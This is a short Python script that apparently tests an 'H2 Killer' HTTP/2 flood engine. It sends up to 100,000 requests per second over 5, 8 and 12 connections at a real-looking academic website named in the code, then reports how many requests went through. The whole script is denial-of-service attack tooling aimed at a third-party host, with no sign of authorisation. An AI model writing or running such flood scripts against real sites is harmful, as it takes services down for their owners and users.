"""Test the H2 Killer Engine."""
import sys, time, threading, queue
sys.path.insert(0, '.')
from core.attack.engines.h2_killer_engine import run_killer_worker

host = 'ojs.phb.ac.id'

for conns in [5, 8, 12]:
    stop = threading.Event()
    q = queue.Queue()
    result = {}
    th = threading.Thread(
        target=run_killer_worker,
        kwargs=dict(
            target_url='https://%s/' % host,
            rps=100000, duration=5, worker_id=1,
            stats_queue=q, stop_event=stop,
            host_header=host, connections=conns,
            result_dict=result,
        ),
        daemon=True,
    )
    t0 = time.time()
    th.start()
    th.join(timeout=10)
    stop.set()
    th.join(timeout=2)
    sent = result.get('sent', 0)
    failed = result.get('failed', 0)
    pending = result.get('pending', 0)
    bytes_sent = result.get('bytes_sent', 0)
    rps = sent / 5
    print(f'{conns} conns: sent={sent}, pending={pending}, failed={failed}, bytes={bytes_sent//1024}KB, RPS={rps:.0f}')
